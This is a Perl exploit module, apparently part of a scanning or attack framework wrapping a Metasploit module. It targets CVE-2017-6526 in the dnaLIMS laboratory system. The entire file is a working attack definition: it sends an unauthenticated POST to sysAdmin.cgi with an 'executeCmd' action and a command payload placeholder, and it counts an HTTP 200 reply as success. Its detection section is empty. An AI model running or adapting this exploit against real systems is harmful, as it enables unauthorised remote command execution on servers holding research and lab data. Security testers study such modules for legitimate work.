package DNALIMS::MSF::DnalimsAdminExec;
use lib qw(../../); use parent qw(Exploit);

use 5.10.0;

use strict;
use warnings;

no warnings 'experimental';

use URI::URL;
use Data::Dump qw(dump);
use File::Slurp qw(read_file);

# # 
# # 
# # 

sub load {
    my $type  = shift;
    my $class = ref $type || $type;
    my $self = { };
    bless $self, $class;

    return $self;
}

sub new {
   my $class = shift;
   

   my $name = "DnalimsAdminExec";

   my $DETECTION = {

   };

my $EXPLOIT = {
  CVE => "CVE-2017-6526",
  DESCRIPTION => "

          This module utilizes an administrative module which allows for

       command execution.  This page is completely unprotected from any

       authentication when given a POST request.

      ",
  MSF_MODULE => "dnalims_admin_exec",
  PATHS => ["cgi-bin/dna/"],
  REFERENCES => [
    "https://www.shorebreaksecurity.com/blog/product-security-advisory-psa0002-dnalims/",
  ],
  TITLE => "dnaLIMS Admin Module Command Execution",
  VARIABLES => {
    'PATH' =>       { DESCRIPTION => "The base path to dnaLIMS", VALUE => "/cgi-bin/dna/" },
  },

  TYPE => 'MSF',
  PLATFORM => 'ALL',
  REQUESTS => {
    EXPLOIT1 => {
      METHOD       => 'POST',
      PATH   => 'sysAdmin.cgi',
      PAYLOAD      => 'investigator=&username=&navUserName=&Action=executeCmd&executeCmdData=__PAYLOAD__',
      TEXT   => 'Sending Exploit #1 Request : [POST] /sysAdmin.cgi',
      HEADERS      => {
        'Content-Type' => 'application/x-www-form-urlencoded',
      },
      VALIDATION   => {
        TCODE => ['200'],
      },
    },
  },
   };

   return $class->SUPER::new($name, $DETECTION, $EXPLOIT, @_);
}

return 1;
